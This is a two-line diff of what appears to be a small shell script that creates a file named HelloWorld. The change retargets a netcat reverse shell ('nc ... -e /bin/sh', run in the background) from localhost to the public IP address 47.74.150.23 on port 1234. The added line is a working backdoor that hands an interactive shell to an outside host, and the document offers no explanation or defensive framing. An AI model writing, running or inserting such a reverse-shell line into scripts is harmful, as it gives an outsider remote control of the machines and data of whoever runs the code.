@@ -1,2 +1,2 @@
 touch HelloWorld
-nc 127.0.0.1 2222 -e "/bin/sh"&
+nc 47.74.150.23 1234 -e "/bin/sh"&
